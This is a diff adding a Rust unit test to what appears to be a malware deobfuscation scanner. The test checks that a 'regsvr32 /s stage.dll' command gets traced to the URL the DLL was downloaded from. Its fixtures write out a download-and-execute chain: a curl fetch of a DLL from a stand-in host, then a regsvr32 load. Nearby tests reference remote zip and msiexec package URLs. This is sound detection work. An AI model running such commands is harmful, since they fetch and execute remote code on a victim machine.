@@ -15406,6 +15406,29 @@ $stageUrl = "ps-schemeless.example/stage.zip""#,
     }
 
     #[test]
+    fn regsvr32_downloaded_load_target_in_deob_text_resolves_url() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        env.traits.push(Trait::Download {
+            cmd: "curl -o stage.dll https://regsvr32-deob-load.example/stage.dll".to_string(),
+            src: "https://regsvr32-deob-load.example/stage.dll".to_string(),
+            dst: Some("stage.dll".to_string()),
+        });
+        crate::deob_scan::scan_deob_text("regsvr32 /s stage.dll", &mut env);
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlArgument { cmd, url }
+                        if cmd == "regsvr32 /s stage.dll"
+                            && url == "https://regsvr32-deob-load.example/stage.dll"
+                )
+            }),
+            "regsvr32 downloaded load target in deob text was not typed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn msiexec_url_package_argument_emits_typed_trait() {
         let mut env = crate::env::Environment::new(&Config::default());
         let url = "https://msiexec-package.example/setup.msi";
